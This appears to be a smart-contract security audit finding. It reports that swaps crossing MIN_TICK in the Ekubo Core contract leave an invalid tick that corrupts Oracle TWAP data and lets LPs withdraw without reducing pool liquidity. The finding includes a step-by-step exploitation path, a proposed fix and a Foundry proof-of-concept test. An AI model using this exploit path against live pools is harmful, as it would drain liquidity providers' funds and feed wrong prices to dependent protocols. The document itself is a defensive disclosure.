## Title
Invalid Tick State After Crossing MIN_TICK Boundary Causes Pool Insolvency and Oracle Corruption

## Summary
When a swap crosses the MIN_TICK boundary in a decreasing direction, the Core contract's swap logic sets the pool's tick to `MIN_TICK - 1`, which is outside the valid tick range. This invalid state corrupts Oracle TWAP data and breaks liquidity accounting in concentrated pools, allowing LPs to withdraw funds without decreasing the pool's active liquidity, leading to pool insolvency.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` - `swap_6269342730()` function, lines 752-756 [1](#0-0) 

**Intended Logic:** When a swap crosses a tick boundary, the current tick should be updated to reflect the new price position. The code comment states "no overflow danger because nextTick is always inside the valid tick bounds."

**Actual Logic:** When `nextTick = MIN_TICK` and the swap is decreasing (`increasing = false`), the assembly code calculates `tick = MIN_TICK - 1`, which equals `-88722836`. This exceeds `MAX_TICK_MAGNITUDE` of `88722835` defined in constants. [2](#0-1) 

**Exploitation Path:**

1. **Initialize Pool at MIN_TICK:** Attacker creates a concentrated liquidity pool initialized at or near MIN_TICK. The `tickToSqrtRatio` function accepts MIN_TICK as valid input since `abs(MIN_TICK) == MAX_TICK_MAGNITUDE`. [3](#0-2) 

2. **Execute Decreasing Swap:** Attacker swaps to push the price down to MIN_SQRT_RATIO. For concentrated pools, `findPrevInitializedTick` returns MIN_TICK when no lower ticks exist. [4](#0-3) 

3. **Invalid Tick Written to State:** The swap crosses MIN_TICK boundary, and the tick update logic sets `tick = MIN_TICK - 1` and writes it to pool state. [5](#0-4) 

4. **Oracle Corruption:** The Oracle extension reads the invalid tick directly and accumulates it into `tickCumulative`, corrupting all TWAP price data. [6](#0-5) 

5. **Liquidity Accounting Failure:** When LPs attempt to update positions with `tickLower = MIN_TICK`, the range check `state.tick() >= positionId.tickLower()` evaluates to `(MIN_TICK - 1 >= MIN_TICK) = false`, skipping pool liquidity updates. [7](#0-6) 

6. **Pool Insolvency:** LPs can withdraw their positions (receiving tokens via debt accounting at line 440), but the pool's active liquidity is never decreased because the tick check fails. The pool becomes insolvent as it has less tokens than its liquidity state indicates. [8](#0-7) 

**Security Property Broken:** 
- **Solvency Invariant:** Pool balances become negative when LPs withdraw without pool liquidity being decreased
- **Withdrawal Availability:** Remaining LPs cannot fully withdraw as pool lacks sufficient tokens
- **Oracle Integrity:** TWAP data is corrupted by accumulating invalid tick values

## Impact Explanation
- **Affected Assets**: All tokens in concentrated liquidity pools initialized at or near MIN_TICK
- **Damage Severity**: 
  - **Pool Insolvency**: After the first LP withdraws post-attack, the pool has insufficient tokens to honor remaining LP positions, causing direct fund loss
  - **Oracle Corruption**: All protocols consuming Ekubo TWAP data receive incorrect price feeds, potentially causing cascading failures in lending protocols, derivatives, liquidation systems
  - **Position Locking**: New LPs depositing to affected positions lose fee-earning opportunities as their liquidity isn't activated
- **User Impact**: All LPs in affected concentrated pools and all downstream protocols relying on Oracle data

## Likelihood Explanation
- **Attacker Profile**: Any user can exploit this with a single swap transaction
- **Preconditions**: 
  - Concentrated liquidity pool exists at or near MIN_TICK
  - Sufficient liquidity exists to execute the swap to MIN_SQRT_RATIO
  - For maximum impact, existing LP positions should have `tickLower = MIN_TICK`
- **Execution Complexity**: Single transaction executing a swap to MIN_SQRT_RATIO
- **Frequency**: Once per pool, but affects all subsequent operations until price moves away from boundary (which may be difficult/expensive if liquidity is concentrated)

## Recommendation

The tick adjustment logic must validate that the resulting tick remains within valid bounds:

```solidity
// In src/Core.sol, function swap_6269342730, lines 752-758:

// CURRENT (vulnerable):
if (sqrtRatioNext == nextTickSqrtRatio) {
    sqrtRatio = sqrtRatioNext;
    assembly ("memory-safe") {
        // no overflow danger because nextTick is always inside the valid tick bounds
        tick := sub(nextTick, iszero(increasing))
    }

// FIXED:
if (sqrtRatioNext == nextTickSqrtRatio) {
    sqrtRatio = sqrtRatioNext;
    assembly ("memory-safe") {
        // For decreasing swaps at MIN_TICK, keep tick at MIN_TICK instead of underflowing
        let adjustment := iszero(increasing)
        let wouldUnderflow := and(eq(nextTick, MIN_TICK), adjustment)
        tick := sub(nextTick, mul(adjustment, iszero(wouldUnderflow)))
    }
```

Alternative mitigation: Prevent pool initialization at exact MIN_TICK/MAX_TICK boundaries by adding validation in `initializePool`.

## Proof of Concept

```solidity
// File: test/Exploit_MinTickBoundaryVulnerability.t.sol
// Run with: forge test --match-test test_MinTickBoundaryVulnerability -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/Positions.sol";
import "./FullTest.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";
import {MIN_SQRT_RATIO} from "../src/types/sqrtRatio.sol";

contract Exploit_MinTickBoundaryVulnerability is FullTest {
    
    function test_MinTickBoundaryVulnerability() public {
        // SETUP: Create concentrated pool at MIN_TICK + 1
        PoolKey memory poolKey = createPool(MIN_TICK + 1, 0, 1);
        
        // LP adds position at full range
        (uint256 tokenId, uint128 liquidityBefore) = createPosition(poolKey, MIN_TICK, MAX_TICK, 1e30, 1e30);
        assertGt(liquidityBefore, 0, "Initial liquidity should be positive");
        
        // Record initial pool state
        (SqrtRatio sqrtRatioBefore, int32 tickBefore, uint128 poolLiquidityBefore) = 
            core.poolState(poolKey.toPoolId()).parse();
        assertEq(poolLiquidityBefore, liquidityBefore, "Pool liquidity should match position");
        assertEq(tickBefore, MIN_TICK + 1, "Should start at MIN_TICK + 1");
        
        // EXPLOIT: Swap to push price to MIN_SQRT_RATIO, crossing MIN_TICK
        token0.approve(address(router), type(uint256).max);
        router.swap({
            poolKey: poolKey,
            isToken1: true,  // Swap token1 for token0 (decreasing price)
            amount: -1,      // Exact output
            sqrtRatioLimit: MIN_SQRT_RATIO,
            skipAhead: 0,
            calculatedAmountThreshold: type(int256).min
        });
        
        // VERIFY: Pool tick is now MIN_TICK - 1 (INVALID!)
        (SqrtRatio sqrtRatioAfter, int32 tickAfter, uint128 poolLiquidityAfter) = 
            core.poolState(poolKey.toPoolId()).parse();
        assertEq(SqrtRatio.unwrap(sqrtRatioAfter), SqrtRatio.unwrap(MIN_SQRT_RATIO));
        assertEq(tickAfter, MIN_TICK - 1, "Vulnerability confirmed: tick is now MIN_TICK - 1");
        
        // VERIFY IMPACT 1: Oracle corruption - invalid tick would be accumulated
        // (Oracle extension would read this invalid tick in maybeInsertSnapshot)
        
        // VERIFY IMPACT 2: Liquidity accounting breaks
        // LP withdraws their position
        uint256 token0Before = token0.balanceOf(address(this));
        uint256 token1Before = token1.balanceOf(address(this));
        
        positions.lock(abi.encodeCall(this.withdrawPosition, (poolKey, tokenId)));
        
        uint256 token0Withdrawn = token0.balanceOf(address(this)) - token0Before;
        uint256 token1Withdrawn = token1.balanceOf(address(this)) - token1Before;
        
        assertGt(token0Withdrawn, 0, "LP should receive tokens");
        assertGt(token1Withdrawn, 0, "LP should receive tokens");
        
        // VERIFY INSOLVENCY: Pool liquidity was NOT decreased!
        (,, uint128 poolLiquidityFinal) = core.poolState(poolKey.toPoolId()).parse();
        assertEq(poolLiquidityFinal, poolLiquidityAfter, 
            "CRITICAL: Pool liquidity unchanged despite LP withdrawal - POOL IS INSOLVENT");
        
        // Pool still reports full liquidity but tokens have been withdrawn
        // Other LPs cannot withdraw fully - pool insolvency confirmed
    }
    
    function withdrawPosition(PoolKey memory poolKey, uint256 tokenId) external {
        positions.updatePositionById(tokenId, -int128(int256(positions.tokenPosition(tokenId).liquidity)));
    }
}
```

## Notes

- This vulnerability is **asymmetric**: it only affects MIN_TICK, not MAX_TICK, because the tick adjustment for increasing swaps at MAX_TICK results in `tick = MAX_TICK - 0 = MAX_TICK` (valid).

- The existing test `test_swap_full_range_to_min_price()` in Router.t.sol explicitly asserts the invalid tick state (`assertEq(tick, MIN_TICK - 1)`), confirming the protocol is aware of this behavior but hasn't considered its downstream impacts. [9](#0-8) 

- The test uses a **stableswap** pool which always updates liquidity (bypassing the tick check), so it doesn't expose the concentrated pool insolvency issue. [10](#0-9) 

- Calling `tickToSqrtRatio(MIN_TICK - 1)` would revert with `InvalidTick`, potentially causing DoS for operations attempting to use the stored tick value. [11](#0-10)

### Citations

**File:** src/Core.sol (L409-416)
```text
                if (state.tick() >= positionId.tickLower() && state.tick() < positionId.tickUpper()) {
                    state = createPoolState({
                        _sqrtRatio: state.sqrtRatio(),
                        _tick: state.tick(),
                        _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                    });
                    writePoolState(poolId, state);
                }
```

**File:** src/Core.sol (L417-424)
```text
            } else {
                // we store the active liquidity in the liquidity slot for stableswap pools
                state = createPoolState({
                    _sqrtRatio: state.sqrtRatio(),
                    _tick: state.tick(),
                    _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                });
                writePoolState(poolId, state);
```

**File:** src/Core.sol (L440-440)
```text
            _updatePairDebtWithNative(locker.id(), poolKey.token0, poolKey.token1, delta0, delta1);
```

**File:** src/Core.sol (L752-756)
```text
                    if (sqrtRatioNext == nextTickSqrtRatio) {
                        sqrtRatio = sqrtRatioNext;
                        assembly ("memory-safe") {
                            // no overflow danger because nextTick is always inside the valid tick bounds
                            tick := sub(nextTick, iszero(increasing))
```

**File:** src/Core.sol (L824-826)
```text
                stateAfter = createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: liquidity});

                writePoolState(poolId, stateAfter);
```

**File:** src/math/constants.sol (L10-14)
```text
int32 constant MIN_TICK = -88722835;

// The maximum tick value supported by the protocol
// Corresponds to the maximum possible price ratio in the protocol
int32 constant MAX_TICK = 88722835;
```

**File:** src/math/ticks.sol (L22-26)
```text
function tickToSqrtRatio(int32 tick) pure returns (SqrtRatio r) {
    unchecked {
        uint256 t = FixedPointMathLib.abs(tick);
        if (t > MAX_TICK_MAGNITUDE) revert InvalidTick(tick);

```

**File:** src/math/tickBitmap.sol (L105-108)
```text
            if (prevTick <= MIN_TICK) {
                prevTick = MIN_TICK;
                break;
            }
```

**File:** src/extensions/Oracle.sol (L125-126)
```text
                _tickCumulative: last.tickCumulative() + int64(uint64(timePassed)) * state.tick()
            });
```

**File:** test/Router.t.sol (L798-798)
```text
        assertEq(tick, MIN_TICK - 1);
```
